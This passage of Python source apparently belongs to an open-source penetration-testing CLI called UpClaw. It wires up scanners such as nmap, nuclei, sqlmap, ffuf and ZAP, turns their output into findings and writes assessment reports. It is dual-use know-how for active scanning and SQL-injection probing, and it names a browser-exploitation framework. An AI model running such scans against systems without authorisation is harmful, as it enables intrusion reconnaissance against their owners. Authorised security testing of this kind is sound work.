    "medium": "MEDIUM",
    "moderate": "MEDIUM",
    "low": "LOW",
    "info": "INFO",
    "informational": "INFO",
}


def _norm_sev(s: str, default: str = "INFO") -> str:
    k = (s or "").strip().lower()
    return _SEV_MAP.get(k, default)


def _bin_path(*names: str) -> str | None:
    """返回 PATH 中首个存在的二进制绝对路径，否则 None。"""
    for n in names:
        p = shutil.which(n)
        if p:
            return p
    return None


def _find_wordlist(cfg: dict[str, Any]) -> str | None:
    """定位目录爆破字典：优先用户配置，其次常见系统路径。"""
    u = cfg.get("wordlist")
    if u and os.path.isfile(str(u)):
        return str(u)
    for c in (
        "/usr/share/wordlists/dirb/common.txt",
        "/usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt",
        "/usr/share/dirb/wordlists/common.txt",
        "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt",
        "/opt/wordlists/common.txt",
        os.path.expanduser("~/wordlists/common.txt"),
    ):
        if os.path.isfile(c):
            return c
    return None


def _run_bin(binary: str, argv: list[str], timeout: float = 120) -> str | None:
    """以列表参数执行外部二进制（禁 shell）。成功返回 stdout+stderr，
    二进制缺失 / 超时 / 异常返回 None。"""
    try:
        cp = subprocess.run(
            [binary, *argv], capture_output=True, text=True,
            errors="replace", timeout=timeout,
        )
    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
        return None
    out = cp.stdout or ""
    err = cp.stderr or ""
    return out if out else err


def _add_finding(store: FindingStore, tool: str, title: str, sev: str,
                 status: str, url: str, location: str, description: str,
                 evidence: str, references: list[str] | None = None,
                 request: str = "") -> None:
    store.add(
        title=title, severity=sev, status=status, category=tool,
        target=url, location=location, description=description,
        evidence=(evidence or "")[:1500], references=references or [],
        request=request or f"{tool} -> {url}",
    )


# ---- 各外部工具适配器（签名统一为 (store, url, cfg)）----
# 返回值约定：None=未安装/不可用，False=条件不满足跳过，True=已执行。

def _ext_run_nuclei(store: FindingStore, url: str, cfg: dict[str, Any]) -> bool | None:
    binary = _bin_path("nuclei")
    if not binary:
        return None
    out = _run_bin(binary, ["-u", url, "-jsonl", "-silent"],
                   timeout=float(cfg.get("ext_nuclei_timeout", 240)))
    if not out:
        return True
    seen = 0
    for line in out.splitlines():
        line = line.strip()
        if not line.startswith("{"):
            continue
        try:
            item = json.loads(line)
        except ValueError:
            continue
        info = item.get("info") or {}
        name = info.get("name") or "Nuclei 匹配"
        sev = _norm_sev(str(info.get("severity", "")), "INFO")
        matched = item.get("matched-at") or item.get("host") or url
        refs = info.get("reference")
        if isinstance(refs, str):
            refs = [refs]
        if not isinstance(refs, list):
            refs = []
        _add_finding(
            store, "nuclei",
            f"Nuclei: {name}",
            sev, "VERIFIED", url, str(matched),
            f"Nuclei 模板 {info.get('template-id') or '-'} 命中即确认真实存在。",
            f"matched-at={matched}" + (f"; matcher-name={item.get('matcher-name')}" if item.get("matcher-name") else ""),
            refs,
        )
        seen += 1
        if seen >= 50:
            break
    return True


def _ext_run_nmap(store: FindingStore, url: str, cfg: dict[str, Any]) -> bool | None:
    binary = _bin_path("nmap")
    if not binary:
        return None
    host, _, _, _ = parse_target(url)
    ports = cfg.get("ext_nmap_ports")
    argv = ["-sT", "-sV", "--version-light", "-Pn", "-T4"]
    if ports:
        argv += ["-p", str(ports)]
    else:
        argv += ["--top-ports", "100"]
    argv += ["-oX", "-", host]
    out = _run_bin(binary, argv, timeout=float(cfg.get("ext_nmap_timeout", 300)))
    if not out:
        return True
    try:
        root = ET.fromstring(out)
    except ET.ParseError:
        return True
    n = 0
    for h in root.iter("host"):
        addr = ""
        for a in h.iter("address"):
            if a.get("addrtype") == "ipv4":
                addr = a.get("addr", "")
                break
        for p in h.iter("port"):
            state = None
            for s in p.iter("state"):
                state = s.get("state")
                break
            if state != "open":
                continue
            pid = p.get("portid", "")
            proto = p.get("protocol", "tcp")
            svc = ""
            prod = ver = ""
            for s in p.iter("service"):
                svc = s.get("name", "")
                prod = s.get("product", "")
                ver = s.get("version", "")
                break
            detail = " ".join(x for x in (prod, ver) if x)
            _add_finding(
                store, "nmap",
                f"Nmap: {pid}/{proto} 端口开放", "INFO", "VERIFIED", url,
                f"{addr}:{pid}",
                f"Nmap 确认 {addr} 的 {pid}/{proto} 端口开放（service={svc}）。",
                f"port={pid}/{proto} service={svc}" + (f" ({detail})" if detail else ""),
            )
            n += 1
            if n >= 60:
                return True
    return True


def _ext_run_sqlmap(store: FindingStore, url: str, cfg: dict[str, Any]) -> bool | None:
    if "?" not in url:
        return False  # 需要带查询参数的 URL
    binary = _bin_path("sqlmap")
    if not binary:
        return None
    tmp = tempfile.mkdtemp(prefix="upclaw-sqlmap-")
    out = _run_bin(
        binary,
        ["-u", url, "--batch", "--level", "1", "--risk", "1", "--smart",
         "--flush-session", "--output-dir", tmp, "--disable-coloring"],
        timeout=float(cfg.get("ext_sqlmap_timeout", 300)),
    )
    if not out:
        return True
    hits = []
    seen: set[str] = set()
    for line in out.splitlines():
        low = line.strip()
        if not low:
            continue
        if ("appears to be injectable" in low or "is vulnerable" in low
                or "injection point" in low):
            key = low[:120]
            if key not in seen:
                seen.add(key)
                hits.append(low.strip())
    union = "UNION query SQL injection" in out
    if hits or "identified the following injection point" in out:
        _add_finding(
            store, "sqlmap",
            "SQLMap: 检测到 SQL 注入点",
            "HIGH" if union else "MEDIUM", "VERIFIED", url, url,
            "sqlmap 经真实请求验证存在可注入参数。",
            " | ".join(hits[:3]) if hits else out.splitlines()[0].strip()[:500],
        )
    return True


def _ext_run_nikto(store: FindingStore, url: str, cfg: dict[str, Any]) -> bool | None:
    binary = _bin_path("nikto", "nikto.pl")
    if not binary:
        return None
    argv = ["-h", url, "-Format", "txt", "-nointeractive",
            "-maxtime", str(int(cfg.get("ext_nikto_maxtime", 120)))]
    out = _run_bin(binary, argv, timeout=float(cfg.get("ext_nikto_timeout", 200)))
    if not out:
        return True
    noise_keys = ("Server:", "Target IP:", "Start time:", "End time:",
                  "Scanning ", "Host ", "Site ", "Completed", "1 host")
    n = 0
    for line in out.splitlines():
        s = line.strip()
        if not s.startswith("+"):
            continue
        body = s[1:].strip()
        if not body or body.startswith(noise_keys):
            continue
        sev = "MEDIUM" if "OSVDB" in body else "LOW"
        _add_finding(
            store, "nikto",
            f"Nikto: {body.split(' (')[0][:80]}",
            sev, "UNVERIFIED", url, url,
            "Nikto 启发式发现，需人工复核（未纳入交付结论）。",
            body[:500],
        )
        n += 1
        if n >= 30:
            break
    return True


def _ext_run_ffuf(store: FindingStore, url: str, cfg: dict[str, Any]) -> bool | None:
    binary = _bin_path("ffuf")
    if not binary:
        return None
    wordlist = _find_wordlist(cfg)
    if not wordlist:
        print("    [i] ffuf 已安装但未找到字典（config wordlist 或常见系统路径），跳过")
        return True
    base = url.rstrip("/") + "/"
    fd, out_json = tempfile.mkstemp(prefix="upclaw-ffuf-", suffix=".json")
    os.close(fd)
    try:
        _run_bin(
            binary,
            ["-u", base + "FUZZ", "-w", wordlist, "-ac", "-t", "20",
             "-timeout", "8", "-mc", "200,204,301,302,307,401,403,500",
             "-of", "json", "-o", out_json],
            timeout=float(cfg.get("ext_ffuf_timeout", 180)),
        )
        try:
            with open(out_json, encoding="utf-8", errors="replace") as f:
                payload = json.load(f)
        except (OSError, ValueError):
            return True
        results = payload.get("results") if isinstance(payload, dict) else payload
        if not isinstance(results, list):
            return True
        n = 0
        for r in results:
            if not isinstance(r, dict):
                continue
            ru = str(r.get("url", ""))
            st = int(r.get("status", 0) or 0)
            sev = "LOW" if st in (200, 401, 403, 500) else "INFO"
            _add_finding(
                store, "ffuf",
                f"FFuf: {ru.rsplit('/', 1)[-1] or ru}", sev, "UNVERIFIED", url, ru,
                "ffuf 自动校准后的大小差异发现（启发式，需人工复核）。",
                f"status={st} length={r.get('length')} words={r.get('words')}",
            )
            n += 1
            if n >= 40:
                break
    finally:
        try:
            os.unlink(out_json)
        except OSError:
            pass
    return True


def _ext_run_dirsearch(store: FindingStore, url: str, cfg: dict[str, Any]) -> bool | None:
    binary = _bin_path("dirsearch", "dirsearch.py")
    if not binary:
        return None
    fd, out_json = tempfile.mkstemp(prefix="upclaw-ds-", suffix=".json")
    os.close(fd)
    try:
        args = ["-u", url, "-o", out_json, "-t", "30"]
        if binary.endswith(".py"):
            args = ["-u", url, "-o", out_json, "-t", "30"]
            out = _run_bin("python", [binary, *args], timeout=float(cfg.get("ext_dirsearch_timeout", 180)))
        else:
            out = _run_bin(binary, args, timeout=float(cfg.get("ext_dirsearch_timeout", 180)))
        if not out and not os.path.isfile(out_json):
            return True
        try:
            with open(out_json, encoding="utf-8", errors="replace") as f:
                data = json.load(f)
        except (OSError, ValueError):
            return True
        results = data.get("results") if isinstance(data, dict) else data
        if not isinstance(results, list):
            return True
        n = 0
        for r in results:
            if not isinstance(r, dict):
                continue
            path = str(r.get("path", ""))
            st = int(r.get("status", 0) or 0)
            sev = "LOW" if st in (200, 401, 403, 500) else "INFO"
            _add_finding(
                store, "dirsearch",
                f"Dirsearch: {path.rsplit('/', 1)[-1] or path}", sev, "UNVERIFIED", url,
                url.rstrip("/") + path,
                "dirsearch 状态码发现（启发式，需人工复核）。",
                f"status={st} length={r.get('content-length') or r.get('content_length')}",
            )
            n += 1
            if n >= 40:
                break
    finally:
        try:
            os.unlink(out_json)
        except OSError:
            pass
    return True


def _ext_run_subfinder(store: FindingStore, url: str, cfg: dict[str, Any]) -> bool | None:
    binary = _bin_path("subfinder")
    if not binary:
        return None
    host, _, _, _ = parse_target(url)
    if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", host):
        return False  # IP 目标无子域
    out = _run_bin(binary, ["-d", host, "-silent"], timeout=float(cfg.get("ext_subfinder_timeout", 120)))
    if not out:
        return True
    subs = [s.strip() for s in out.splitlines() if s.strip() and "." in s]
    if not subs:
        return True
    _add_finding(
        store, "subfinder",
        f"Subfinder: 发现 {len(subs)} 个子域名", "INFO", "VERIFIED", url, host,
        "通过被动源枚举发现的子域名（资产面扩大）。",
        ", ".join(subs[:60]),
    )
    return True


def _ext_run_httpx(store: FindingStore, url: str, cfg: dict[str, Any]) -> bool | None:
    binary = _bin_path("httpx")
    if not binary:
        return None
    out = _run_bin(binary, ["-u", url, "-json", "-silent", "-timeout", "8"],
                   timeout=float(cfg.get("ext_httpx_timeout", 90)))
    if not out:
        return True
    n = 0
    for line in out.splitlines():
        line = line.strip()
        if not line.startswith("{"):
            continue
        try:
            item = json.loads(line)
        except ValueError:
            continue
        lu = str(item.get("url") or item.get("input") or url)
        title = item.get("title")
        tech = item.get("tech") or item.get("webserver") or item.get("server")
        bits = [f"status={item.get('status_code')}"]
        if title:
            bits.append(f"title={title}")
        if tech:
            t = tech if isinstance(tech, str) else ",".join(tech[:8] if isinstance(tech, list) else [])
            bits.append(f"tech={t}")
        _add_finding(
            store, "httpx",
            f"HTTPX: {lu.rstrip('/').rsplit('/', 1)[-1] or lu} 存活", "INFO", "VERIFIED", url, lu,
            "httpx 探测确认目标存活并返回有效响应。",
            " ".join(bits),
        )
        n += 1
        if n >= 5:
            break
    return True


def _ext_run_zap(store: FindingStore, url: str, cfg: dict[str, Any]) -> bool | None:
    """OWASP ZAP：优先 zap-baseline.py（需 ZAP 已安装且可脚本化），
    仅 zap-cli 时提示人工方式，无入口则跳过。"""
    base = _bin_path("zap-baseline.py")
    if not base:
        zap_cli = _bin_path("zap-cli")
        if not zap_cli:
            return None
        print("    [i] 检测到 zap-cli：需人工启动 ZAP 守护进程后使用（q 查看 tools 说明），跳过自动扫描")
        return True
    fd, out_json = tempfile.mkstemp(prefix="upclaw-zap-", suffix=".json")
    os.close(fd)
    try:
        _run_bin("python", [base, "-t", url, "-J", out_json, "-l", "MEDIUM"],
                 timeout=float(cfg.get("ext_zap_timeout", 600)))
        try:
            with open(out_json, encoding="utf-8", errors="replace") as f:
                data = json.load(f)
        except (OSError, ValueError):
            return True
        alerts = data.get("alerts") if isinstance(data, dict) else None
        if not isinstance(alerts, list):
            return True
        n = 0
        for a in alerts:
            if not isinstance(a, dict):
                continue
            name = str(a.get("alert") or "ZAP 告警")
            risk = str(a.get("risk") or "Low")
            _add_finding(
                store, "zap",
                f"ZAP: {name}", _norm_sev(risk, "LOW"), "VERIFIED", url,
                str(a.get("url") or url),
                "ZAP 主动扫描确认（基线脚本产出）。",
                (str(a.get("evidence") or a.get("description") or ""))[:400],
            )
            n += 1
            if n >= 40:
                break
    finally:
        try:
            os.unlink(out_json)
        except OSError:
            pass
    return True


# 可自动执行的外部工具（顺序即扫描阶段的执行顺序）
EXT_TOOL_RUN: dict[str, Callable[[FindingStore, str, dict[str, Any]], bool | None]] = {
    "subfinder": _ext_run_subfinder,
    "httpx": _ext_run_httpx,
    "nmap": _ext_run_nmap,
    "nuclei": _ext_run_nuclei,
    "sqlmap": _ext_run_sqlmap,
    "nikto": _ext_run_nikto,
    "ffuf": _ext_run_ffuf,
    "dirsearch": _ext_run_dirsearch,
    "zap": _ext_run_zap,
}

# 检测展示用元数据（含无 CLI 的 GUI/API 类工具）
EXT_TOOL_LIST: list[dict[str, Any]] = [
    {"name": "nuclei", "display": "Nuclei", "category": "漏洞扫描·模板化", "binaries": ["nuclei"]},
    {"name": "nmap", "display": "Nmap", "category": "端口/服务识别", "binaries": ["nmap"]},
    {"name": "sqlmap", "display": "SQLMap", "category": "SQL 注入验证", "binaries": ["sqlmap"]},
    {"name": "nikto", "display": "Nikto", "category": "Web 启发式扫描", "binaries": ["nikto", "nikto.pl"]},
    {"name": "ffuf", "display": "FFuf", "category": "目录/参数爆破", "binaries": ["ffuf"]},
    {"name": "dirsearch", "display": "Dirsearch", "category": "目录枚举", "binaries": ["dirsearch", "dirsearch.py"]},
    {"name": "subfinder", "display": "Subfinder", "category": "子域名枚举", "binaries": ["subfinder"]},
    {"name": "httpx", "display": "HTTPX", "category": "存活/技术栈探测", "binaries": ["httpx"]},
    {"name": "zap", "display": "OWASP ZAP", "category": "Web 主动扫描", "binaries": ["zap-baseline.py", "zap-cli", "zap"]},
    {"name": "yakit", "display": "Yakit(API)", "category": "一体化平台", "binaries": ["yakit", "yak"], "manual": True},
    {"name": "beef", "display": "BeEF", "category": "浏览器利用", "binaries": ["beef-xss", "beef"], "manual": True},
    {"name": "burpsuite", "display": "Burp Suite(API)", "category": "专业代理扫描", "binaries": ["BurpSuitePro", "burpsuite"], "manual": True},
    {"name": "appscan", "display": "AppScan(CLI)", "category": "企业级扫描", "binaries": ["appscan"], "manual": True},
    {"name": "arl", "display": "ARL 灯塔", "category": "资产侦察(Web)", "binaries": [], "manual": True},
]


def ext_tool_status() -> dict[str, dict[str, Any]]:
    """返回 {name: {installed, path, manual, display, category}} 检测结果。"""
    out: dict[str, dict[str, Any]] = {}
    for spec in EXT_TOOL_LIST:
        n = spec["name"]
        if spec.get("manual") and not spec.get("binaries"):
            out[n] = {**spec, "installed": False, "path": ""}
            continue
        p = _bin_path(*spec["binaries"])
        out[n] = {**spec, "installed": bool(p), "path": p or ""}
    return out


def run_external_phase(store: FindingStore, url: str, cfg: dict[str, Any], args: argparse.Namespace) -> int:
    """执行外部工具阶段。返回实际执行成功的工具数。"""
    restrict = getattr(args, "ext_tools", None)
    allow = {x.strip().lower() for x in restrict.split(",") if x.strip()} if restrict else None
    ran = 0
    skipped = []
    print("[*] 外置工具适配（可选，--no-ext 关闭）...")
    for name, fn in EXT_TOOL_RUN.items():
        if allow is not None and name not in allow:
            continue
        try:
            r = fn(store, url, cfg)
        except Exception as e:  # noqa: BLE001 适配器异常不影响主流程
            print(f"    [!] {name} 执行异常: {e}")
            continue
        if r is None:
            skipped.append(name)
        elif r is False:
            print(f"    [i] {name} 条件不满足，跳过")
        else:
            ran += 1
            if getattr(args, "verbose", False):
                print(f"    · {name} 完成")
    if skipped:
        print(f"    [i] 未安装的外部工具: {', '.join(skipped)}（可先安装后再扫描）")
    if not ran and not skipped:
        print("    [i] 未检测到已安装的外部工具")
    return ran


# 将可自动执行的外部工具注册进模块注册表（支持 -c nuclei 等单独调用；
# 默认扫描的 --checks 不包含它们，由外部工具阶段自动启用）
for _ext_name, _ext_fn in EXT_TOOL_RUN.items():
    AVAILABLE[_ext_name] = _ext_fn
del _ext_name, _ext_fn



"""报告生成：Markdown / HTML / JSON，并归档原始证据。

UpClaw 全量开源（Apache-2.0 License），报告无版本限制、无水印，可直接交付。
"""


import html


SEV_COLOR = {
    "CRITICAL": "#dc2626",
    "HIGH": "#ea580c",
    "MEDIUM": "#d97706",
    "LOW": "#0891b2",
    "INFO": "#64748b",
}


def build_meta(target: str, started: float, cfg: dict[str, Any]) -> dict[str, Any]:

    return {
        "tool": "UpClaw",
        "version": "0.4.0",
        "target": target,
        "started_at": datetime.fromtimestamp(started).astimezone().isoformat(timespec="seconds"),
        "finished_at": datetime.now().astimezone().isoformat(timespec="seconds"),
        "duration_sec": round(time.time() - started, 2),
        "license_tier": "Apache-2.0 (Open Source)",
        "commercial": True,
        "config": {
            "timeout": cfg.get("timeout"),
            "threads": cfg.get("threads"),
            "rate_limit": cfg.get("rate_limit"),
        },
    }


def _md_escape(s: str) -> str:
    return (s or "").replace("|", "\\|").replace("\n", " ")


def render_markdown(meta: dict[str, Any], store: FindingStore, recon: dict[str, Any]) -> str:
    v, u = store.verified(), store.unverified()
    counts = store.counts()
    L: list[str] = []
    L.append(f"# UpClaw 安全评估报告")
    L.append("")
    L.append(f"- **目标**: {meta['target']}")
    L.append(f"- **扫描时间**: {meta['started_at']} → {meta['finished_at']}（{meta['duration_sec']}s）")
    L.append(f"- **授权等级**: {meta['license_tier']}")
    L.append(f"- **已验证发现**: {len(v)}　|　**待人工复核**: {len(u)}")
    L.append("")
    L.append("> 本报告仅针对已获得明确书面授权的目标生成。")
    L.append("")

    # 统计
    L.append("## 风险概览")
    L.append("")
    L.append("| 等级 | 数量 |")
    L.append("|---|---|")
    for s in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
        L.append(f"| {s} | {counts.get(s,0)} |")
    L.append("")

    # 目标画像
    if recon:
        L.append("## 目标画像")
        L.append("")
        fp = recon.get("fingerprint") or {}
        if fp and not fp.get("error"):
            L.append(f"- 状态码: {fp.get('status')}")
            if fp.get("server"):
                L.append(f"- Server: {fp.get('server')}")
            if fp.get("title"):
                L.append(f"- 标题: {fp.get('title')}")
            if fp.get("technologies"):
                L.append(f"- 技术栈: {', '.join(fp['technologies'])}")
        ports = recon.get("ports") or []
        if ports:
            L.append(f"- 开放端口 ({len(ports)}): " + ", ".join(f"{p['port']}/{p['service']}" for p in ports))
        L.append("")

    # 已验证发现
    L.append("## 已验证发现（可交付）")
    L.append("")
    if not v:
        L.append("未发现已验证的安全问题。")
        L.append("")
    for f in sorted(v, key=lambda x: -["INFO","LOW","MEDIUM","HIGH","CRITICAL"].index(x.severity)):
        L.append(f"### [{f.severity}] {f.title}")
        L.append("")
        L.append(f"- **编号**: {f.id}")
        L.append(f"- **位置**: {f.location}")
        L.append(f"- **类别**: {f.category}")
        L.append(f"- **描述**: {f.description}")
        if f.impact:
            L.append(f"- **影响**: {f.impact}")
        if f.evidence:
            L.append("")
            L.append("**证据**")
            L.append("")
            L.append("```")
            L.append(f.evidence)
            L.append("```")
        if f.remediation:
            L.append("")
            L.append(f"**修复建议**: {f.remediation}")
        L.append("")

    # 待复核
    if u:
        L.append("## 待人工复核（未纳入交付结论）")
        L.append("")
        L.append("以下条目证据不足，UpClaw 不将其计入正式结论，仅供人工排查参考。")
        L.append("")
        for f in u:
            L.append(f"- [{f.severity}] {f.title} —— {f.location}")
            if f.evidence:
                L.append(f"  - 线索: {_md_escape(f.evidence)[:200]}")
        L.append("")

    if not meta.get("commercial", False):
        L.append("---")
        L.append("")
        L.append("*本报告由 UpClaw 生成，遵循 Apache-2.0 开源协议，可自由用于学习与商业交付。*")
        L.append("")
    return "\n".join(L)


def render_html(meta: dict[str, Any], store: FindingStore, recon: dict[str, Any]) -> str:
    v, u = store.verified(), store.unverified()
    counts = store.counts()
    order = ["INFO", "LOW", "MEDIUM", "HIGH", "CRITICAL"]
    def badge(sev: str) -> str:
        return f'<span class="sev" style="background:{SEV_COLOR.get(sev,"#64748b")}">{sev}</span>'

    def finding_card(f: Any) -> str:
        ev = html.escape(f.evidence or "")
        return f"""
    <div class="finding">
      <div class="fhead">
        {badge(f.severity)}
        <h3>{html.escape(f.title)}</h3>
        <span class="fid">{f.id}</span>
      </div>
      <div class="fmeta">
        <div><b>位置</b> {html.escape(f.location)}</div>
        <div><b>类别</b> {html.escape(f.category)}</div>
        <div><b>状态</b> <span class="ver">已验证</span></div>
      </div>
      <p class="desc">{html.escape(f.description)}</p>
      {f'<div class="impact"><b>影响</b> {html.escape(f.impact)}</div>' if f.impact else ''}
      {f'<div class="ev"><b>证据</b><pre>{ev}</pre></div>' if ev else ''}
      {f'<div class="fix"><b>修复建议</b><div>{html.escape(f.remediation)}</div></div>' if f.remediation else ''}
    </div>"""

    cards = "\n".join(
        finding_card(f) for f in sorted(v, key=lambda x: -order.index(x.severity))
    ) or '<p class="empty">未发现已验证的安全问题。</p>'

    # 目标画像
    fp = (recon or {}).get("fingerprint") or {}
    ports = (recon or {}).get("ports") or []
    profile = ""
    if fp and not fp.get("error"):
        techs = "".join(f'<span class="tag">{html.escape(t)}</span>' for t in (fp.get("technologies") or []))
        profile = f"""
      <div class="kv"><b>状态码</b> {fp.get('status')}</div>
      <div class="kv"><b>Server</b> {html.escape(fp.get('server') or '-')}</div>
      <div class="kv"><b>标题</b> {html.escape(fp.get('title') or '-')}</div>
      <div class="kv"><b>技术栈</b> {techs or '-'}</div>"""
    if ports:
        plist = ", ".join(f"{p['port']}/{html.escape(p['service'])}" for p in ports)
        profile += f'<div class="kv"><b>开放端口</b> {plist}</div>'

    unv = ""
    if u:
        items = "".join(
            f'<li>{badge(f.severity)} <b>{html.escape(f.title)}</b>'
            f' <span class="loc">{html.escape(f.location)}</span></li>'
            for f in u
        )
        unv = f"""
    <h2>待人工复核 <span class="hint">（证据不足，未纳入交付结论）</span></h2>
    <ul class="unverified">{items}</ul>"""

    watermark = ""

    return f"""<!DOCTYPE html>
<html lang="zh-CN"><head><meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>UpClaw 报告 · {html.escape(meta['target'])}</title>
<style>
  :root{{--bg:#0b1220;--panel:#121a2b;--border:#233044;--text:#e6edf3;--muted:#93a2b8;--acc:#22d3ee}}
  *{{box-sizing:border-box}}
  body{{margin:0;background:var(--bg);color:var(--text);
    font-family:system-ui,-apple-system,'Segoe UI','PingFang SC','Microsoft YaHei',sans-serif;line-height:1.65}}
  .wrap{{max-width:960px;margin:0 auto;padding:40px 24px}}
  h1{{font-size:26px;margin:0 0 6px}}
  h2{{font-size:19px;margin:34px 0 14px;padding-top:14px;border-top:1px solid var(--border)}}
  .sub{{color:var(--muted);font-size:14px;margin-bottom:20px}}
  .cards{{display:flex;gap:12px;flex-wrap:wrap;margin:18px 0 8px}}
  .card{{flex:1;min-width:110px;background:var(--panel);border:1px solid var(--border);
    border-radius:10px;padding:14px;text-align:center}}
  .card .n{{font-size:24px;font-weight:800}}
  .card .l{{font-size:12px;color:var(--muted)}}
  .profile{{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:16px}}
  .kv{{font-size:14px;color:var(--muted);padding:3px 0}}
  .kv b{{display:inline-block;width:70px;color:var(--text)}}
  .tag{{display:inline-block;background:#1c2942;color:var(--acc);border-radius:5px;
    padding:1px 8px;font-size:12px;margin-right:6px}}
  .finding{{background:var(--panel);border:1px solid var(--border);border-radius:10px;
    padding:18px;margin-bottom:14px}}
  .fhead{{display:flex;align-items:center;gap:10px;flex-wrap:wrap}}
  .fhead h3{{margin:0;font-size:16px;flex:1}}
  .sev{{font-size:11px;font-weight:700;color:#fff;border-radius:5px;padding:3px 9px}}
  .fid{{font-family:ui-monospace,monospace;font-size:12px;color:var(--muted)}}
  .fmeta{{display:flex;gap:22px;flex-wrap:wrap;font-size:13px;color:var(--muted);margin:10px 0}}
  .ver{{color:#34d399;font-weight:600}}
  .desc{{margin:8px 0}}
  .impact{{font-size:14px;color:var(--muted);margin-bottom:8px}}
  .ev pre,.fix div{{background:#0a0f1a;border:1px solid var(--border);border-radius:8px;
    padding:12px;overflow-x:auto;font-family:ui-monospace,monospace;font-size:12.5px;
    white-space:pre-wrap;word-break:break-all}}
  .fix{{margin-top:8px;font-size:14px}}
  .unverified{{list-style:none;padding:0}}
  .unverified li{{background:var(--panel);border:1px solid var(--border);border-radius:8px;
    padding:10px 14px;margin-bottom:8px;font-size:14px}}
  .loc{{color:var(--muted);font-size:13px}}
  .hint{{font-size:12px;color:var(--muted);font-weight:400}}
  .empty{{color:var(--muted)}}
  .watermark{{margin-top:30px;padding:12px 16px;border:1px dashed #4b5563;border-radius:8px;
    color:var(--muted);font-size:13px;text-align:center}}
</style></head>
<body><div class="wrap">
  <h1>UpClaw 安全评估报告</h1>
  <div class="sub">
    目标 <b>{html.escape(meta['target'])}</b> ·
    {meta['started_at']} → {meta['finished_at']}（{meta['duration_sec']}s） ·
    授权等级 {meta['license_tier']}
  </div>
  <div class="cards">
    {''.join(f'<div class="card"><div class="n" style="color:{SEV_COLOR[s]}">{counts.get(s,0)}</div><div class="l">{s}</div></div>' for s in reversed(order))}
  </div>
  <h2>目标画像</h2>
  <div class="profile">{profile or '<span class="empty">无</span>'}</div>
  <h2>已验证发现 <span class="hint">（共 {len(v)} 项，可交付）</span></h2>
  {cards}
  {unv}
  {watermark}
</div></body></html>"""


def save_reports(
    out_dir: str,
    meta: dict[str, Any],
    store: FindingStore,
    recon: dict[str, Any],
    formats: list[str] | None = None,
) -> dict[str, str]:
    """输出报告文件，返回 {格式: 路径}。"""
    formats = formats or ["html", "md", "json"]
    os.makedirs(out_dir, exist_ok=True)
    paths: dict[str, str] = {}

    if "md" in formats:
        p = os.path.join(out_dir, "report.md")
        with open(p, "w", encoding="utf-8") as f:
            f.write(render_markdown(meta, store, recon))
        paths["md"] = p

    if "html" in formats:
        p = os.path.join(out_dir, "report.html")
        with open(p, "w", encoding="utf-8") as f:
            f.write(render_html(meta, store, recon))
        paths["html"] = p

    if "json" in formats:
        p = os.path.join(out_dir, "findings.json")
        with open(p, "w", encoding="utf-8") as f:
            json.dump(
                {
                    "meta": meta,
                    "counts": store.counts(),
                    "findings": [f.to_dict() for f in store.sorted_items()],
                    "recon": recon,
                },
                f,
                ensure_ascii=False,
                indent=2,
            )
        paths["json"] = p

    # 证据归档
    ev_dir = os.path.join(out_dir, "evidence")
    os.makedirs(ev_dir, exist_ok=True)
    for f in store.verified():
        fp_ = os.path.join(ev_dir, f"{f.id}.txt")
        with open(fp_, "w", encoding="utf-8") as fh:
            fh.write(f"[{f.severity}] {f.title}\n")
            fh.write(f"编号: {f.id}\n位置: {f.location}\n")
            fh.write(f"请求: {f.request}\n\n--- 证据 ---\n{f.evidence}\n")
    return paths



"""UpClaw 命令行入口。

所有扫描类子命令在执行前都会经过 require_authorization 门禁。
"""


import argparse


BANNER = r"""
  __  __        ____ _
 |  \/  |_ __ / ___| | __ ___      __
 | |\/| | '_ \ | |  | |/ _` \ \ /\ / /
 | |  | | |_) | |__| | (_| |\ V  V /
 |_|  |_| .__/ \____|_|\__,_| \_/\_/
        |_|      v{VER}

 AI 驱动的渗透测试 CLI 工具 · 仅用于已授权的安全测试
""".replace("{VER}", __version__)


# ---------------------------------------------------------------- 工具函数

def _pick_url(target: str, cfg: dict[str, Any]) -> tuple[str, str]:
    """把用户输入整理成可用 URL。返回 (url, 备注)。"""
    if "://" in target:
        return target, ""
    host, port, _scheme, path = parse_target(target)
    ip = resolve(host)
    if not ip:
        return "", f"无法解析主机: {host}"
    candidates: list[str] = []
    if port in (443, 8443):
        candidates = [f"https://{host}:{port}{path}", f"http://{host}:{port}{path}"]
    elif port == 80:
        candidates = [f"http://{host}{path}", f"https://{host}{path}"]
    else:
        candidates = [f"https://{host}:{port}{path}", f"http://{host}:{port}{path}"]
    for c in candidates:
        r = http_request(
            c,
            timeout=float(cfg.get("timeout", 6.0)),
            verify_tls=bool(cfg.get("verify_tls", False)),
            user_agent=str(cfg.get("user_agent", "UpClaw/0.1.0")),
            follow_redirects=True,
        )
        if r.ok:
            return c, ""
        if r.status:
            return c, ""
    return candidates[0], "目标无 HTTP 响应，将仅做端口探测"


def _parse_ports(s: str | None) -> list[int] | None:
    if not s:
        return None
    out: list[int] = []
    for part in s.split(","):
        part = part.strip()
        if not part:
            continue
        if "-" in part:
            a, b = part.split("-", 1)
            try:
                out.extend(range(int(a), int(b) + 1))
            except ValueError:
                raise SystemExit(f"[!] 端口范围非法: {part}")
        else:
            try:
                out.append(int(part))
            except ValueError:
                raise SystemExit(f"[!] 端口号非法: {part}")
    return out or None


# ---------------------------------------------------------------- 子命令

# ================================================================
# === UPCLAW-V0.4-MANUAL-TOOLS ===
# 手动测试三件套（Burp Repeater / Decoder / Comparer 的 CLI 等价物）：
#   upclaw req   —— 手动改包重放单请求（等价 Repeater）
#   upclaw codec —— 编解码（等价 Decoder）
#   upclaw cmp   —— 双请求响应对比（等价 Comparer）
# 仅标准库，零第三方依赖；复用顶部 http_request 引擎。
# ================================================================

import base64
import binascii
import difflib


def _manual_render_request(method: str, url: str, headers: dict[str, str], body: str | None) -> str:
    """还原将要发送的原始请求文本（供 --raw 回显与报告取证）。"""
    p = urllib.parse.urlparse(url if "://" in url else "https://" + url)
    host = p.netloc
    path = p.path or "/"
    if p.query:
        path += "?" + p.query
    lines = [f"{method} {path} HTTP/1.1", f"Host: {host}"]
    for k, v in headers.items():
        lines.append(f"{k}: {v}")
    lines.append("")
    if body:
        lines.append(body)
    return "\r\n".join(lines)


